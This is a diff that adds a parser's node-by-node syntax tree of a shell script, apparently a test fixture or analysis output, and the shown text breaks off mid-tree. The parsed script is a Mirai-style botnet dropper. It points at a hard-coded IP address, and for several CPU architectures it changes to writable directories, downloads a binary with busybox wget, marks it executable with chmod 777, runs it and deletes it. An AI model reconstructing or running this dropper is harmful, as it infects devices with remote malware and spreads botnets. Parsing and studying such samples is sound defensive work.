@@ -1,0 +1,1667 @@
+CommandNode(lineno=2, pos=(12, 25), parts=[
+  WordNode(lineno=2, pos=(12, 18), word='ulimit'),
+  WordNode(lineno=2, pos=(19, 21), word='-n'),
+  WordNode(lineno=2, pos=(22, 25), word='712'),
+])
+CommandNode(lineno=4, pos=(27, 58), parts=[
+  AssignmentNode(lineno=4, pos=(27, 58), word='path=http://79.137.38.163/bin'),
+])
+CommandNode(lineno=6, pos=(60, 77), parts=[
+  AssignmentNode(lineno=6, pos=(60, 77), word='mips=SYSTEMmips'),
+])
+CommandNode(lineno=7, pos=(78, 99), parts=[
+  AssignmentNode(lineno=7, pos=(78, 99), word='mipsel=SYSTEMmipsel'),
+])
+CommandNode(lineno=8, pos=(100, 121), parts=[
+  WordNode(lineno=8, pos=(100, 121), word='armv4l=SYSTEMarmv4l'),
+])
+CommandNode(lineno=9, pos=(122, 143), parts=[
+  WordNode(lineno=9, pos=(122, 143), word='armv5l=SYSTEMarmv5l'),
+])
+CommandNode(lineno=10, pos=(144, 165), parts=[
+  WordNode(lineno=10, pos=(144, 165), word='armv6l=SYSTEMarmv6l'),
+])
+CommandNode(lineno=11, pos=(166, 187), parts=[
+  WordNode(lineno=11, pos=(166, 187), word='armv7l=SYSTEMarmv7l'),
+])
+CommandNode(lineno=12, pos=(188, 205), parts=[
+  WordNode(lineno=12, pos=(188, 205), word='i586=SYSTEMi586'),
+])
+CommandNode(lineno=13, pos=(206, 223), parts=[
+  WordNode(lineno=13, pos=(206, 223), word='i686=SYSTEMi686'),
+])
+CommandNode(lineno=14, pos=(224, 241), parts=[
+  WordNode(lineno=14, pos=(224, 241), word='m68k=SYSTEMm68k'),
+])
+CommandNode(lineno=15, pos=(242, 257), parts=[
+  WordNode(lineno=15, pos=(242, 257), word='sh4=SYSTEMsh4'),
+])
+CommandNode(lineno=16, pos=(258, 281), parts=[
+  AssignmentNode(lineno=16, pos=(258, 281), word='powerpc=SYSTEMpowerpc'),
+])
+CommandNode(lineno=17, pos=(282, 315), parts=[
+  WordNode(lineno=17, pos=(282, 315), word='powerpc440fp=SYSTEMpowerpc440fp'),
+])
+CommandNode(lineno=18, pos=(316, 337), parts=[
+  WordNode(lineno=18, pos=(316, 337), word='x86_64=SYSTEMx86_64'),
+])
+CompoundNode(lineno=48, list=[
+  IfNode(lineno=48, pos=(339, 4849), parts=[
+    ReservedwordNode(lineno=20, pos=(339, 341), word='if'),
+    ListNode(lineno=20, pos=(342, 362), parts=[
+        CommandNode(lineno=20, pos=(342, 361), parts=[
+          WordNode(lineno=20, pos=(342, 343), word='['),
+          WordNode(lineno=20, pos=(344, 346), word='-f'),
+          WordNode(lineno=20, pos=(347, 359), word='/bin/busybox'),
+          WordNode(lineno=20, pos=(360, 361), word=']'),
+        ]),
+        OperatorNode(lineno=20, op=';', pos=(361, 362)),
+      ]),
+    ReservedwordNode(lineno=20, pos=(363, 367), word='then'),
+    ListNode(lineno=34, pos=(368, 3220), parts=[
+        CommandNode(lineno=21, pos=(368, 375), parts=[
+          WordNode(lineno=21, pos=(368, 370), word='cd'),
+          WordNode(lineno=21, pos=(371, 375), word='/tmp'),
+        ]),
+        OperatorNode(lineno=21, op='||', pos=(376, 378)),
+        CommandNode(lineno=21, pos=(379, 390), parts=[
+          WordNode(lineno=21, pos=(379, 381), word='cd'),
+          WordNode(lineno=21, pos=(382, 390), word='/var/run'),
+        ]),
+        OperatorNode(lineno=21, op='||', pos=(391, 393)),
+        CommandNode(lineno=21, pos=(394, 405), parts=[
+          WordNode(lineno=21, pos=(394, 396), word='cd'),
+          WordNode(lineno=21, pos=(397, 405), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=21, op='||', pos=(406, 408)),
+        CommandNode(lineno=21, pos=(409, 416), parts=[
+          WordNode(lineno=21, pos=(409, 411), word='cd'),
+          WordNode(lineno=21, pos=(412, 416), word='/mnt'),
+        ]),
+        OperatorNode(lineno=21, op='||', pos=(417, 419)),
+        CommandNode(lineno=21, pos=(420, 427), parts=[
+          WordNode(lineno=21, pos=(420, 422), word='cd'),
+          WordNode(lineno=21, pos=(423, 427), word='/var'),
+        ]),
+        OperatorNode(lineno=21, op=';', pos=(427, 428)),
+        CommandNode(lineno=21, pos=(429, 459), parts=[
+          WordNode(lineno=21, pos=(429, 441), word='/bin/busybox'),
+          WordNode(lineno=21, pos=(442, 444), word='cp'),
+          WordNode(lineno=21, pos=(445, 457), word='/bin/busybox'),
+          WordNode(lineno=21, pos=(458, 459), word='.'),
+        ]),
+        OperatorNode(lineno=21, op=';', pos=(459, 460)),
+        CommandNode(lineno=21, pos=(461, 490), parts=[
+          WordNode(lineno=21, pos=(461, 473), word='/bin/busybox'),
+          WordNode(lineno=21, pos=(474, 478), word='wget'),
+          WordNode(lineno=21, pos=(479, 490), word='$path/$mips', parts=[
+            ParameterNode(lineno=21, pos=(479, 484), value='path'),
+            ParameterNode(lineno=21, pos=(485, 490), value='mips'),
+          ]),
+        ]),
+        OperatorNode(lineno=21, op=';', pos=(490, 491)),
+        CommandNode(lineno=21, pos=(492, 524), parts=[
+          WordNode(lineno=21, pos=(492, 504), word='/bin/busybox'),
+          WordNode(lineno=21, pos=(505, 508), word='cat'),
+          WordNode(lineno=21, pos=(509, 514), word='$mips', parts=[
+            ParameterNode(lineno=21, pos=(509, 514), value='mips'),
+          ]),
+          RedirectNode(lineno=21, output=
+            WordNode(lineno=21, pos=(517, 524), word='busybox'), pos=(515, 524), type='>'),
+        ]),
+        OperatorNode(lineno=21, op=';', pos=(524, 525)),
+        CommandNode(lineno=21, pos=(526, 556), parts=[
+          WordNode(lineno=21, pos=(526, 538), word='/bin/busybox'),
+          WordNode(lineno=21, pos=(539, 544), word='chmod'),
+          WordNode(lineno=21, pos=(545, 548), word='777'),
+          WordNode(lineno=21, pos=(549, 556), word='busybox'),
+        ]),
+        OperatorNode(lineno=21, op=';', pos=(556, 557)),
+        CommandNode(lineno=21, pos=(558, 567), parts=[
+          WordNode(lineno=21, pos=(558, 567), word='./busybox'),
+        ]),
+        OperatorNode(lineno=21, op=';', pos=(567, 568)),
+        CommandNode(lineno=21, pos=(569, 583), parts=[
+          WordNode(lineno=21, pos=(569, 571), word='rm'),
+          WordNode(lineno=21, pos=(572, 575), word='-rf'),
+          WordNode(lineno=21, pos=(576, 583), word='busybox'),
+        ]),
+        OperatorNode(lineno=22, op='\n', pos=(583, 584)),
+        CommandNode(lineno=22, pos=(584, 591), parts=[
+          WordNode(lineno=22, pos=(584, 586), word='cd'),
+          WordNode(lineno=22, pos=(587, 591), word='/tmp'),
+        ]),
+        OperatorNode(lineno=22, op='||', pos=(592, 594)),
+        CommandNode(lineno=22, pos=(595, 606), parts=[
+          WordNode(lineno=22, pos=(595, 597), word='cd'),
+          WordNode(lineno=22, pos=(598, 606), word='/var/run'),
+        ]),
+        OperatorNode(lineno=22, op='||', pos=(607, 609)),
+        CommandNode(lineno=22, pos=(610, 621), parts=[
+          WordNode(lineno=22, pos=(610, 612), word='cd'),
+          WordNode(lineno=22, pos=(613, 621), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=22, op='||', pos=(622, 624)),
+        CommandNode(lineno=22, pos=(625, 632), parts=[
+          WordNode(lineno=22, pos=(625, 627), word='cd'),
+          WordNode(lineno=22, pos=(628, 632), word='/mnt'),
+        ]),
+        OperatorNode(lineno=22, op='||', pos=(633, 635)),
+        CommandNode(lineno=22, pos=(636, 643), parts=[
+          WordNode(lineno=22, pos=(636, 638), word='cd'),
+          WordNode(lineno=22, pos=(639, 643), word='/var'),
+        ]),
+        OperatorNode(lineno=22, op=';', pos=(643, 644)),
+        CommandNode(lineno=22, pos=(645, 675), parts=[
+          WordNode(lineno=22, pos=(645, 657), word='/bin/busybox'),
+          WordNode(lineno=22, pos=(658, 660), word='cp'),
+          WordNode(lineno=22, pos=(661, 673), word='/bin/busybox'),
+          WordNode(lineno=22, pos=(674, 675), word='.'),
+        ]),
+        OperatorNode(lineno=22, op=';', pos=(675, 676)),
+        CommandNode(lineno=22, pos=(677, 708), parts=[
+          WordNode(lineno=22, pos=(677, 689), word='/bin/busybox'),
+          WordNode(lineno=22, pos=(690, 694), word='wget'),
+          WordNode(lineno=22, pos=(695, 708), word='$path/$mipsel', parts=[
+            ParameterNode(lineno=22, pos=(695, 700), value='path'),
+            ParameterNode(lineno=22, pos=(701, 708), value='mipsel'),
+          ]),
+        ]),
+        OperatorNode(lineno=22, op=';', pos=(708, 709)),
+        CommandNode(lineno=22, pos=(710, 744), parts=[
+          WordNode(lineno=22, pos=(710, 722), word='/bin/busybox'),
+          WordNode(lineno=22, pos=(723, 726), word='cat'),
+          WordNode(lineno=22, pos=(727, 734), word='$mipsel', parts=[
+            ParameterNode(lineno=22, pos=(727, 734), value='mipsel'),
+          ]),
+          RedirectNode(lineno=22, output=
+            WordNode(lineno=22, pos=(737, 744), word='busybox'), pos=(735, 744), type='>'),
+        ]),
+        OperatorNode(lineno=22, op=';', pos=(744, 745)),
+        CommandNode(lineno=22, pos=(746, 776), parts=[
+          WordNode(lineno=22, pos=(746, 758), word='/bin/busybox'),
+          WordNode(lineno=22, pos=(759, 764), word='chmod'),
+          WordNode(lineno=22, pos=(765, 768), word='777'),
+          WordNode(lineno=22, pos=(769, 776), word='busybox'),
+        ]),
+        OperatorNode(lineno=22, op=';', pos=(776, 777)),
+        CommandNode(lineno=22, pos=(778, 787), parts=[
+          WordNode(lineno=22, pos=(778, 787), word='./busybox'),
+        ]),
+        OperatorNode(lineno=22, op=';', pos=(787, 788)),
+        CommandNode(lineno=22, pos=(789, 803), parts=[
+          WordNode(lineno=22, pos=(789, 791), word='rm'),
+          WordNode(lineno=22, pos=(792, 795), word='-rf'),
+          WordNode(lineno=22, pos=(796, 803), word='busybox'),
+        ]),
+        OperatorNode(lineno=23, op='\n', pos=(803, 804)),
+        CommandNode(lineno=23, pos=(804, 811), parts=[
+          WordNode(lineno=23, pos=(804, 806), word='cd'),
+          WordNode(lineno=23, pos=(807, 811), word='/tmp'),
+        ]),
+        OperatorNode(lineno=23, op='||', pos=(812, 814)),
+        CommandNode(lineno=23, pos=(815, 826), parts=[
+          WordNode(lineno=23, pos=(815, 817), word='cd'),
+          WordNode(lineno=23, pos=(818, 826), word='/var/run'),
+        ]),
+        OperatorNode(lineno=23, op='||', pos=(827, 829)),
+        CommandNode(lineno=23, pos=(830, 841), parts=[
+          WordNode(lineno=23, pos=(830, 832), word='cd'),
+          WordNode(lineno=23, pos=(833, 841), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=23, op='||', pos=(842, 844)),
+        CommandNode(lineno=23, pos=(845, 852), parts=[
+          WordNode(lineno=23, pos=(845, 847), word='cd'),
+          WordNode(lineno=23, pos=(848, 852), word='/mnt'),
+        ]),
+        OperatorNode(lineno=23, op='||', pos=(853, 855)),
+        CommandNode(lineno=23, pos=(856, 863), parts=[
+          WordNode(lineno=23, pos=(856, 858), word='cd'),
+          WordNode(lineno=23, pos=(859, 863), word='/var'),
+        ]),
+        OperatorNode(lineno=23, op=';', pos=(863, 864)),
+        CommandNode(lineno=23, pos=(865, 895), parts=[
+          WordNode(lineno=23, pos=(865, 877), word='/bin/busybox'),
+          WordNode(lineno=23, pos=(878, 880), word='cp'),
+          WordNode(lineno=23, pos=(881, 893), word='/bin/busybox'),
+          WordNode(lineno=23, pos=(894, 895), word='.'),
+        ]),
+        OperatorNode(lineno=23, op=';', pos=(895, 896)),
+        CommandNode(lineno=23, pos=(897, 928), parts=[
+          WordNode(lineno=23, pos=(897, 909), word='/bin/busybox'),
+          WordNode(lineno=23, pos=(910, 914), word='wget'),
+          WordNode(lineno=23, pos=(915, 928), word='$path/$armv4l', parts=[
+            ParameterNode(lineno=23, pos=(915, 920), value='path'),
+            ParameterNode(lineno=23, pos=(921, 928), value='armv4l'),
+          ]),
+        ]),
+        OperatorNode(lineno=23, op=';', pos=(928, 929)),
+        CommandNode(lineno=23, pos=(930, 964), parts=[
+          WordNode(lineno=23, pos=(930, 942), word='/bin/busybox'),
+          WordNode(lineno=23, pos=(943, 946), word='cat'),
+          WordNode(lineno=23, pos=(947, 954), word='$armv4l', parts=[
+            ParameterNode(lineno=23, pos=(947, 954), value='armv4l'),
+          ]),
+          RedirectNode(lineno=23, output=
+            WordNode(lineno=23, pos=(957, 964), word='busybox'), pos=(955, 964), type='>'),
+        ]),
+        OperatorNode(lineno=23, op=';', pos=(964, 965)),
+        CommandNode(lineno=23, pos=(966, 996), parts=[
+          WordNode(lineno=23, pos=(966, 978), word='/bin/busybox'),
+          WordNode(lineno=23, pos=(979, 984), word='chmod'),
+          WordNode(lineno=23, pos=(985, 988), word='777'),
+          WordNode(lineno=23, pos=(989, 996), word='busybox'),
+        ]),
+        OperatorNode(lineno=23, op=';', pos=(996, 997)),
+        CommandNode(lineno=23, pos=(998, 1007), parts=[
+          WordNode(lineno=23, pos=(998, 1007), word='./busybox'),
+        ]),
+        OperatorNode(lineno=23, op=';', pos=(1007, 1008)),
+        CommandNode(lineno=23, pos=(1009, 1023), parts=[
+          WordNode(lineno=23, pos=(1009, 1011), word='rm'),
+          WordNode(lineno=23, pos=(1012, 1015), word='-rf'),
+          WordNode(lineno=23, pos=(1016, 1023), word='busybox'),
+        ]),
+        OperatorNode(lineno=24, op='\n', pos=(1023, 1024)),
+        CommandNode(lineno=24, pos=(1024, 1031), parts=[
+          WordNode(lineno=24, pos=(1024, 1026), word='cd'),
+          WordNode(lineno=24, pos=(1027, 1031), word='/tmp'),
+        ]),
+        OperatorNode(lineno=24, op='||', pos=(1032, 1034)),
+        CommandNode(lineno=24, pos=(1035, 1046), parts=[
+          WordNode(lineno=24, pos=(1035, 1037), word='cd'),
+          WordNode(lineno=24, pos=(1038, 1046), word='/var/run'),
+        ]),
+        OperatorNode(lineno=24, op='||', pos=(1047, 1049)),
+        CommandNode(lineno=24, pos=(1050, 1061), parts=[
+          WordNode(lineno=24, pos=(1050, 1052), word='cd'),
+          WordNode(lineno=24, pos=(1053, 1061), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=24, op='||', pos=(1062, 1064)),
+        CommandNode(lineno=24, pos=(1065, 1072), parts=[
+          WordNode(lineno=24, pos=(1065, 1067), word='cd'),
+          WordNode(lineno=24, pos=(1068, 1072), word='/mnt'),
+        ]),
+        OperatorNode(lineno=24, op='||', pos=(1073, 1075)),
+        CommandNode(lineno=24, pos=(1076, 1083), parts=[
+          WordNode(lineno=24, pos=(1076, 1078), word='cd'),
+          WordNode(lineno=24, pos=(1079, 1083), word='/var'),
+        ]),
+        OperatorNode(lineno=24, op=';', pos=(1083, 1084)),
+        CommandNode(lineno=24, pos=(1085, 1115), parts=[
+          WordNode(lineno=24, pos=(1085, 1097), word='/bin/busybox'),
+          WordNode(lineno=24, pos=(1098, 1100), word='cp'),
+          WordNode(lineno=24, pos=(1101, 1113), word='/bin/busybox'),
+          WordNode(lineno=24, pos=(1114, 1115), word='.'),
+        ]),
+        OperatorNode(lineno=24, op=';', pos=(1115, 1116)),
+        CommandNode(lineno=24, pos=(1117, 1148), parts=[
+          WordNode(lineno=24, pos=(1117, 1129), word='/bin/busybox'),
+          WordNode(lineno=24, pos=(1130, 1134), word='wget'),
+          WordNode(lineno=24, pos=(1135, 1148), word='$path/$armv5l', parts=[
+            ParameterNode(lineno=24, pos=(1135, 1140), value='path'),
+            ParameterNode(lineno=24, pos=(1141, 1148), value='armv5l'),
+          ]),
+        ]),
+        OperatorNode(lineno=24, op=';', pos=(1148, 1149)),
+        CommandNode(lineno=24, pos=(1150, 1184), parts=[
+          WordNode(lineno=24, pos=(1150, 1162), word='/bin/busybox'),
+          WordNode(lineno=24, pos=(1163, 1166), word='cat'),
+          WordNode(lineno=24, pos=(1167, 1174), word='$armv5l', parts=[
+            ParameterNode(lineno=24, pos=(1167, 1174), value='armv5l'),
+          ]),
+          RedirectNode(lineno=24, output=
+            WordNode(lineno=24, pos=(1177, 1184), word='busybox'), pos=(1175, 1184), type='>'),
+        ]),
+        OperatorNode(lineno=24, op=';', pos=(1184, 1185)),
+        CommandNode(lineno=24, pos=(1186, 1216), parts=[
+          WordNode(lineno=24, pos=(1186, 1198), word='/bin/busybox'),
+          WordNode(lineno=24, pos=(1199, 1204), word='chmod'),
+          WordNode(lineno=24, pos=(1205, 1208), word='777'),
+          WordNode(lineno=24, pos=(1209, 1216), word='busybox'),
+        ]),
+        OperatorNode(lineno=24, op=';', pos=(1216, 1217)),
+        CommandNode(lineno=24, pos=(1218, 1227), parts=[
+          WordNode(lineno=24, pos=(1218, 1227), word='./busybox'),
+        ]),
+        OperatorNode(lineno=24, op=';', pos=(1227, 1228)),
+        CommandNode(lineno=24, pos=(1229, 1243), parts=[
+          WordNode(lineno=24, pos=(1229, 1231), word='rm'),
+          WordNode(lineno=24, pos=(1232, 1235), word='-rf'),
+          WordNode(lineno=24, pos=(1236, 1243), word='busybox'),
+        ]),
+        OperatorNode(lineno=25, op='\n', pos=(1243, 1244)),
+        CommandNode(lineno=25, pos=(1244, 1251), parts=[
+          WordNode(lineno=25, pos=(1244, 1246), word='cd'),
+          WordNode(lineno=25, pos=(1247, 1251), word='/tmp'),
+        ]),
+        OperatorNode(lineno=25, op='||', pos=(1252, 1254)),
+        CommandNode(lineno=25, pos=(1255, 1266), parts=[
+          WordNode(lineno=25, pos=(1255, 1257), word='cd'),
+          WordNode(lineno=25, pos=(1258, 1266), word='/var/run'),
+        ]),
+        OperatorNode(lineno=25, op='||', pos=(1267, 1269)),
+        CommandNode(lineno=25, pos=(1270, 1281), parts=[
+          WordNode(lineno=25, pos=(1270, 1272), word='cd'),
+          WordNode(lineno=25, pos=(1273, 1281), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=25, op='||', pos=(1282, 1284)),
+        CommandNode(lineno=25, pos=(1285, 1292), parts=[
+          WordNode(lineno=25, pos=(1285, 1287), word='cd'),
+          WordNode(lineno=25, pos=(1288, 1292), word='/mnt'),
+        ]),
+        OperatorNode(lineno=25, op='||', pos=(1293, 1295)),
+        CommandNode(lineno=25, pos=(1296, 1303), parts=[
+          WordNode(lineno=25, pos=(1296, 1298), word='cd'),
+          WordNode(lineno=25, pos=(1299, 1303), word='/var'),
+        ]),
+        OperatorNode(lineno=25, op=';', pos=(1303, 1304)),
+        CommandNode(lineno=25, pos=(1305, 1335), parts=[
+          WordNode(lineno=25, pos=(1305, 1317), word='/bin/busybox'),
+          WordNode(lineno=25, pos=(1318, 1320), word='cp'),
+          WordNode(lineno=25, pos=(1321, 1333), word='/bin/busybox'),
+          WordNode(lineno=25, pos=(1334, 1335), word='.'),
+        ]),
+        OperatorNode(lineno=25, op=';', pos=(1335, 1336)),
+        CommandNode(lineno=25, pos=(1337, 1368), parts=[
+          WordNode(lineno=25, pos=(1337, 1349), word='/bin/busybox'),
+          WordNode(lineno=25, pos=(1350, 1354), word='wget'),
+          WordNode(lineno=25, pos=(1355, 1368), word='$path/$armv6l', parts=[
+            ParameterNode(lineno=25, pos=(1355, 1360), value='path'),
+            ParameterNode(lineno=25, pos=(1361, 1368), value='armv6l'),
+          ]),
+        ]),
+        OperatorNode(lineno=25, op=';', pos=(1368, 1369)),
+        CommandNode(lineno=25, pos=(1370, 1404), parts=[
+          WordNode(lineno=25, pos=(1370, 1382), word='/bin/busybox'),
+          WordNode(lineno=25, pos=(1383, 1386), word='cat'),
+          WordNode(lineno=25, pos=(1387, 1394), word='$armv6l', parts=[
+            ParameterNode(lineno=25, pos=(1387, 1394), value='armv6l'),
+          ]),
+          RedirectNode(lineno=25, output=
+            WordNode(lineno=25, pos=(1397, 1404), word='busybox'), pos=(1395, 1404), type='>'),
+        ]),
+        OperatorNode(lineno=25, op=';', pos=(1404, 1405)),
+        CommandNode(lineno=25, pos=(1406, 1436), parts=[
+          WordNode(lineno=25, pos=(1406, 1418), word='/bin/busybox'),
+          WordNode(lineno=25, pos=(1419, 1424), word='chmod'),
+          WordNode(lineno=25, pos=(1425, 1428), word='777'),
+          WordNode(lineno=25, pos=(1429, 1436), word='busybox'),
+        ]),
+        OperatorNode(lineno=25, op=';', pos=(1436, 1437)),
+        CommandNode(lineno=25, pos=(1438, 1447), parts=[
+          WordNode(lineno=25, pos=(1438, 1447), word='./busybox'),
+        ]),
+        OperatorNode(lineno=25, op=';', pos=(1447, 1448)),
+        CommandNode(lineno=25, pos=(1449, 1463), parts=[
+          WordNode(lineno=25, pos=(1449, 1451), word='rm'),
+          WordNode(lineno=25, pos=(1452, 1455), word='-rf'),
+          WordNode(lineno=25, pos=(1456, 1463), word='busybox'),
+        ]),
+        OperatorNode(lineno=26, op='\n', pos=(1463, 1464)),
+        CommandNode(lineno=26, pos=(1464, 1471), parts=[
+          WordNode(lineno=26, pos=(1464, 1466), word='cd'),
+          WordNode(lineno=26, pos=(1467, 1471), word='/tmp'),
+        ]),
+        OperatorNode(lineno=26, op='||', pos=(1472, 1474)),
+        CommandNode(lineno=26, pos=(1475, 1486), parts=[
+          WordNode(lineno=26, pos=(1475, 1477), word='cd'),
+          WordNode(lineno=26, pos=(1478, 1486), word='/var/run'),
+        ]),
+        OperatorNode(lineno=26, op='||', pos=(1487, 1489)),
+        CommandNode(lineno=26, pos=(1490, 1501), parts=[
+          WordNode(lineno=26, pos=(1490, 1492), word='cd'),
+          WordNode(lineno=26, pos=(1493, 1501), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=26, op='||', pos=(1502, 1504)),
+        CommandNode(lineno=26, pos=(1505, 1512), parts=[
+          WordNode(lineno=26, pos=(1505, 1507), word='cd'),
+          WordNode(lineno=26, pos=(1508, 1512), word='/mnt'),
+        ]),
+        OperatorNode(lineno=26, op='||', pos=(1513, 1515)),
+        CommandNode(lineno=26, pos=(1516, 1523), parts=[
+          WordNode(lineno=26, pos=(1516, 1518), word='cd'),
+          WordNode(lineno=26, pos=(1519, 1523), word='/var'),
+        ]),
+        OperatorNode(lineno=26, op=';', pos=(1523, 1524)),
+        CommandNode(lineno=26, pos=(1525, 1555), parts=[
+          WordNode(lineno=26, pos=(1525, 1537), word='/bin/busybox'),
+          WordNode(lineno=26, pos=(1538, 1540), word='cp'),
+          WordNode(lineno=26, pos=(1541, 1553), word='/bin/busybox'),
+          WordNode(lineno=26, pos=(1554, 1555), word='.'),
+        ]),
+        OperatorNode(lineno=26, op=';', pos=(1555, 1556)),
+        CommandNode(lineno=26, pos=(1557, 1588), parts=[
+          WordNode(lineno=26, pos=(1557, 1569), word='/bin/busybox'),
+          WordNode(lineno=26, pos=(1570, 1574), word='wget'),
+          WordNode(lineno=26, pos=(1575, 1588), word='$path/$armv7l', parts=[
+            ParameterNode(lineno=26, pos=(1575, 1580), value='path'),
+            ParameterNode(lineno=26, pos=(1581, 1588), value='armv7l'),
+          ]),
+        ]),
+        OperatorNode(lineno=26, op=';', pos=(1588, 1589)),
+        CommandNode(lineno=26, pos=(1590, 1624), parts=[
+          WordNode(lineno=26, pos=(1590, 1602), word='/bin/busybox'),
+          WordNode(lineno=26, pos=(1603, 1606), word='cat'),
+          WordNode(lineno=26, pos=(1607, 1614), word='$armv7l', parts=[
+            ParameterNode(lineno=26, pos=(1607, 1614), value='armv7l'),
+          ]),
+          RedirectNode(lineno=26, output=
+            WordNode(lineno=26, pos=(1617, 1624), word='busybox'), pos=(1615, 1624), type='>'),
+        ]),
+        OperatorNode(lineno=26, op=';', pos=(1624, 1625)),
+        CommandNode(lineno=26, pos=(1626, 1656), parts=[
+          WordNode(lineno=26, pos=(1626, 1638), word='/bin/busybox'),
+          WordNode(lineno=26, pos=(1639, 1644), word='chmod'),
+          WordNode(lineno=26, pos=(1645, 1648), word='777'),
+          WordNode(lineno=26, pos=(1649, 1656), word='busybox'),
+        ]),
+        OperatorNode(lineno=26, op=';', pos=(1656, 1657)),
+        CommandNode(lineno=26, pos=(1658, 1667), parts=[
+          WordNode(lineno=26, pos=(1658, 1667), word='./busybox'),
+        ]),
+        OperatorNode(lineno=26, op=';', pos=(1667, 1668)),
+        CommandNode(lineno=26, pos=(1669, 1683), parts=[
+          WordNode(lineno=26, pos=(1669, 1671), word='rm'),
+          WordNode(lineno=26, pos=(1672, 1675), word='-rf'),
+          WordNode(lineno=26, pos=(1676, 1683), word='busybox'),
+        ]),
+        OperatorNode(lineno=27, op='\n', pos=(1683, 1684)),
+        CommandNode(lineno=27, pos=(1684, 1691), parts=[
+          WordNode(lineno=27, pos=(1684, 1686), word='cd'),
+          WordNode(lineno=27, pos=(1687, 1691), word='/tmp'),
+        ]),
+        OperatorNode(lineno=27, op='||', pos=(1692, 1694)),
+        CommandNode(lineno=27, pos=(1695, 1706), parts=[
+          WordNode(lineno=27, pos=(1695, 1697), word='cd'),
+          WordNode(lineno=27, pos=(1698, 1706), word='/var/run'),
+        ]),
+        OperatorNode(lineno=27, op='||', pos=(1707, 1709)),
+        CommandNode(lineno=27, pos=(1710, 1721), parts=[
+          WordNode(lineno=27, pos=(1710, 1712), word='cd'),
+          WordNode(lineno=27, pos=(1713, 1721), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=27, op='||', pos=(1722, 1724)),
+        CommandNode(lineno=27, pos=(1725, 1732), parts=[
+          WordNode(lineno=27, pos=(1725, 1727), word='cd'),
+          WordNode(lineno=27, pos=(1728, 1732), word='/mnt'),
+        ]),
+        OperatorNode(lineno=27, op='||', pos=(1733, 1735)),
+        CommandNode(lineno=27, pos=(1736, 1743), parts=[
+          WordNode(lineno=27, pos=(1736, 1738), word='cd'),
+          WordNode(lineno=27, pos=(1739, 1743), word='/var'),
+        ]),
+        OperatorNode(lineno=27, op=';', pos=(1743, 1744)),
+        CommandNode(lineno=27, pos=(1745, 1775), parts=[
+          WordNode(lineno=27, pos=(1745, 1757), word='/bin/busybox'),
+          WordNode(lineno=27, pos=(1758, 1760), word='cp'),
+          WordNode(lineno=27, pos=(1761, 1773), word='/bin/busybox'),
+          WordNode(lineno=27, pos=(1774, 1775), word='.'),
+        ]),
+        OperatorNode(lineno=27, op=';', pos=(1775, 1776)),
+        CommandNode(lineno=27, pos=(1777, 1806), parts=[
+          WordNode(lineno=27, pos=(1777, 1789), word='/bin/busybox'),
+          WordNode(lineno=27, pos=(1790, 1794), word='wget'),
+          WordNode(lineno=27, pos=(1795, 1806), word='$path/$i586', parts=[
+            ParameterNode(lineno=27, pos=(1795, 1800), value='path'),
+            ParameterNode(lineno=27, pos=(1801, 1806), value='i586'),
+          ]),
+        ]),
+        OperatorNode(lineno=27, op=';', pos=(1806, 1807)),
+        CommandNode(lineno=27, pos=(1808, 1840), parts=[
+          WordNode(lineno=27, pos=(1808, 1820), word='/bin/busybox'),
+          WordNode(lineno=27, pos=(1821, 1824), word='cat'),
+          WordNode(lineno=27, pos=(1825, 1830), word='$i586', parts=[
+            ParameterNode(lineno=27, pos=(1825, 1830), value='i586'),
+          ]),
+          RedirectNode(lineno=27, output=
+            WordNode(lineno=27, pos=(1833, 1840), word='busybox'), pos=(1831, 1840), type='>'),
+        ]),
+        OperatorNode(lineno=27, op=';', pos=(1840, 1841)),
+        CommandNode(lineno=27, pos=(1842, 1872), parts=[
+          WordNode(lineno=27, pos=(1842, 1854), word='/bin/busybox'),
+          WordNode(lineno=27, pos=(1855, 1860), word='chmod'),
+          WordNode(lineno=27, pos=(1861, 1864), word='777'),
+          WordNode(lineno=27, pos=(1865, 1872), word='busybox'),
+        ]),
+        OperatorNode(lineno=27, op=';', pos=(1872, 1873)),
+        CommandNode(lineno=27, pos=(1874, 1883), parts=[
+          WordNode(lineno=27, pos=(1874, 1883), word='./busybox'),
+        ]),
+        OperatorNode(lineno=27, op=';', pos=(1883, 1884)),
+        CommandNode(lineno=27, pos=(1885, 1899), parts=[
+          WordNode(lineno=27, pos=(1885, 1887), word='rm'),
+          WordNode(lineno=27, pos=(1888, 1891), word='-rf'),
+          WordNode(lineno=27, pos=(1892, 1899), word='busybox'),
+        ]),
+        OperatorNode(lineno=28, op='\n', pos=(1899, 1900)),
+        CommandNode(lineno=28, pos=(1900, 1907), parts=[
+          WordNode(lineno=28, pos=(1900, 1902), word='cd'),
+          WordNode(lineno=28, pos=(1903, 1907), word='/tmp'),
+        ]),
+        OperatorNode(lineno=28, op='||', pos=(1908, 1910)),
+        CommandNode(lineno=28, pos=(1911, 1922), parts=[
+          WordNode(lineno=28, pos=(1911, 1913), word='cd'),
+          WordNode(lineno=28, pos=(1914, 1922), word='/var/run'),
+        ]),
+        OperatorNode(lineno=28, op='||', pos=(1923, 1925)),
+        CommandNode(lineno=28, pos=(1926, 1937), parts=[
+          WordNode(lineno=28, pos=(1926, 1928), word='cd'),
+          WordNode(lineno=28, pos=(1929, 1937), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=28, op='||', pos=(1938, 1940)),
+        CommandNode(lineno=28, pos=(1941, 1948), parts=[
+          WordNode(lineno=28, pos=(1941, 1943), word='cd'),
+          WordNode(lineno=28, pos=(1944, 1948), word='/mnt'),
+        ]),
+        OperatorNode(lineno=28, op='||', pos=(1949, 1951)),
+        CommandNode(lineno=28, pos=(1952, 1959), parts=[
+          WordNode(lineno=28, pos=(1952, 1954), word='cd'),
+          WordNode(lineno=28, pos=(1955, 1959), word='/var'),
+        ]),
+        OperatorNode(lineno=28, op=';', pos=(1959, 1960)),
+        CommandNode(lineno=28, pos=(1961, 1991), parts=[
+          WordNode(lineno=28, pos=(1961, 1973), word='/bin/busybox'),
+          WordNode(lineno=28, pos=(1974, 1976), word='cp'),
+          WordNode(lineno=28, pos=(1977, 1989), word='/bin/busybox'),
+          WordNode(lineno=28, pos=(1990, 1991), word='.'),
+        ]),
+        OperatorNode(lineno=28, op=';', pos=(1991, 1992)),
